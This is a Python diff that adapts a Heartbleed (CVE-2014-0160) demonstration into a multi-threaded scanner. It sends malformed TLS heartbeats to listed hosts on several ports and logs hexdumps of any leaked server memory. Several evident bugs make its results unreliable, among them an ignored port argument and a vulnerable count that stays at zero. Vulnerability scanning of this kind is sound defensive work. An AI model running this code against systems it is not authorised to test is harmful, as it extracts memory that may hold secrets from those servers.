@@ -1,11 +1,12 @@
-#!/usr/bin/env python -w
+#!/usr/bin/env python
+#
+# Multi-threaded, multi-host vulnerability scanner for CVE-2014-0160 :heartbleed bug
+#
+# Author: Sorin Sbarnea @ citrix . com
+#
+# Based on an original version made by by Jared Stafford (jspenguin@jspenguin.org)
 
-# Bases on:
-# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
-# The author disclaims copyright to this source code.
-
-# Patcher: Sorin Sbarnea
-
+import os
 import sys
 import struct
 import socket
@@ -14,11 +15,27 @@ import select
 import re
 import logging
 from optparse import OptionParser
+import multiprocessing
+from multiprocessing import Process, Manager, Pool
+
 
 options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
 options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
 options.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS')
 options.add_option('-d', '--debug', action='store_true', default=False, help='Enable debug output')
+
+
+def check_port(address, port):
+	# Create a TCP socket
+	s = socket.socket()
+	logging.debug("Attempting to connect to %s on port %s" % (address, port))
+	try:
+		s.connect((address, port))
+		logging.debug("Connected to %s on port %s" % (address, port))
+		return True
+	except socket.error, e:
+		logging.debug("Connection to %s on port %s failed: %s" % (address, port, e))
+		return False
 
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
@@ -47,12 +64,13 @@ hb = h2bin('''
 ''')
 
 def hexdump(s):
+    ret = ""
     for b in xrange(0, len(s), 16):
         lin = [c for c in s[b : b + 16]]
         hxdat = ' '.join('%02X' % ord(c) for c in lin)
         pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
-        print '  %04x: %-48s %s' % (b, hxdat, pdat)
-    print
+        ret += '  %04x: %-48s %s\n' % (b, hxdat, pdat)
+    return ret
 
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
@@ -76,86 +94,178 @@ def recvall(s, length, timeout=5):
 def recvmsg(s):
     hdr = recvall(s, 5)
     if hdr is None:
-        print 'Unexpected EOF receiving record header - server closed connection'
+        logging.debug('Unexpected EOF receiving record header - server closed connection')
         return None, None, None
     typ, ver, ln = struct.unpack('>BHH', hdr)
     pay = recvall(s, ln, 10)
     if pay is None:
-        print 'Unexpected EOF receiving record payload - server closed connection'
+        logging.debug('Unexpected EOF receiving record payload - server closed connection')
         return None, None, None
-    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
+    logging.debug(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
     return typ, ver, pay
 
 def hit_hb(s):
+    """
+    True = vulnerable
+    """
     s.send(hb)
     while True:
         typ, ver, pay = recvmsg(s)
         if typ is None:
-            print 'No heartbeat response received, server likely not vulnerable'
+            logging.debug('No heartbeat response received, server likely not vulnerable')
             return False
 
         if typ == 24:
-            print 'Received heartbeat response:'
-            hexdump(pay)
+            logging.debug('Received heartbeat response:')
+            logging.debug(hexdump(pay))
             if len(pay) > 3:
-                print 'WARNING: server returned more data than it should - server is vulnerable!'
+                logging.warn('WARNING: server returned more data than it should - server is vulnerable!')
             else:
-                print 'Server processed malformed heartbeat, but did not return any extra data.'
+                logging.debug('Server processed malformed heartbeat, but did not return any extra data.')
             return True
 
         if typ == 21:
-            print 'Received alert:'
-            hexdump(pay)
-            print 'Server returned error, likely not vulnerable'
+            logging.debug('Received alert:')
+            logging.debug(hexdump(pay))
+            logging.debug('Server returned error, likely not vulnerable')
             return False
 
-def main():
+def main(host, port=443, debug=False, starttls=False):
+    """
+
+    False : is not vulnerable
+    True : is vulnerable
+    2 : failed to validate
+    3 : START TLS failed
+
+    """
+    """
+    """
+    """
     opts, args = options.parse_args()
     if len(args) < 1:
         options.print_help()
         return
+    """
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print 'Connecting... %s:%s' % (args[0], opts.port)
+    logging.debug('Connecting... %s:%s' % (host, port))
     sys.stdout.flush()
     try:
-        s.connect((args[0], opts.port))
+        s.connect((host, port))
     except Exception, e:
         logging.error("Exception: %s" % e)
-        sys.exit(2)
+        return 2
 
-    if opts.starttls:
-        re = s.recv(4096)
-        if opts.debug: print re
+    if starttls:
+        res = s.recv(4096)
+        if debug: logging.debug(res)
         s.send('ehlo starttlstest\n')
-        re = s.recv(1024)
-        if opts.debug: print re
-        if not 'STARTTLS' in re:
-            if opts.debug: print re
-            print 'STARTTLS not supported...'
-            sys.exit(0)
+        res = s.recv(1024)
+        if debug: logging.debug(res)
+        if not 'STARTTLS' in res:
+            if debug: logging.debug(res)
+            logging.error('STARTTLS not supported...')
+            return 3
         s.send('starttls\n')
-        re = s.recv(1024)
+        res = s.recv(1024)
     
-    print 'Sending Client Hello...'
+    logging.debug('Sending Client Hello...')
     sys.stdout.flush()
     s.send(hello)
-    print 'Waiting for Server Hello...'
+    logging.debug('Waiting for Server Hello...')
     sys.stdout.flush()
     while True:
         typ, ver, pay = recvmsg(s)
-        if typ == None:
-            print 'Server closed connection without sending Server Hello.'
-            return
+        if typ is None:
+            logging.debug('Server closed connection without sending Server Hello.')
+            return 2
         # Look for server hello done message.
         if typ == 22 and ord(pay[0]) == 0x0E:
             break
 
-    print 'Sending heartbeat request...'
+    logging.debug('Sending heartbeat request...')
     sys.stdout.flush()
     s.send(hb)
-    return hit_hb(s)
+    try:
+        ret = hit_hb(s)
+    except Exception, e:
+        if e.errno == 54:
+            # We do assume that Connection reset by peer is acceptable.
+            return False
+        logging.error("%s:%s %s" % (host, port, e))
+    return ret
+
+manager = Manager()
+vulnerables = manager.dict()
+
+
+def f(x):
+    host, port, vulnerables = x
+    if check_port(host, port):
+        ret = main(host)
+        if ret is True :  # 2 means skipped due to internal error
+            vulnerables[(host,port)]=ret
 
 if __name__ == '__main__':
-    ret = main()
-    sys.exit(ret)
+
+    start = time.time()
+
+    hosts = {}
+    errors = 0
+
+
+    if os.path.isfile("hosts"):
+        _hosts = open("hosts","r").readlines()
+    elif os.environ['HOSTS']:
+        _hosts = os.environ['HOSTS'].split()
+    for host in _hosts:
+        host = host.strip()
+        if host and host[0] != "#":
+            ip = socket.gethostbyname(host)
+            if ip not in hosts:
+                hosts[ip]=[host]
+            elif host not in hosts[ip]:
+                hosts[ip].append(host)
+
+    ports = [ 443, 25, 587, 143, 993, 465, 21, 22]
+
+    to_check = []
+    threads = multiprocessing.cpu_count()*4
+    logging.warning("Running on %s threads and having to scan %s hosts" % (threads, len(hosts)))
+    pool = Pool(processes=threads)
+    for host in hosts:
+        for port in ports:
+            service = "%s:%s" % (host, port)
+            to_check.append((host, port, vulnerables))
+
+            #print(service)
+
+            """
+            if check_port(host, port):
+                service = "%s:%s" % (host, port)
+                print(service)
+                to_check.append((host, port))
+                #ret = main(host)
+                #if not ret:
+                #    vulnerables[(host,port)]=ret
+                #    errors += 1
+                """
+
+    rs = pool.map_async(f, to_check)
+    while not rs.ready():
+        print("%s jobs left..." % rs._number_left)
+        time.sleep(3)
+
+    if vulnerables:
+        listing = ""
+        for host, port in sorted(vulnerables.keys()):
+            listing += "\t%s:%s => %s\n" % (host, port, ", ".join(sorted(hosts[host])))
+
+        logging.error("Found %s/%s (%.0f%%) vulnerable hosts:\n%s" % \
+                      (errors, len(hosts), errors*100/len(hosts), listing))
+
+
+    end = time.time()
+
+    print("-- done in %.0fs seconds --" % (end - start))
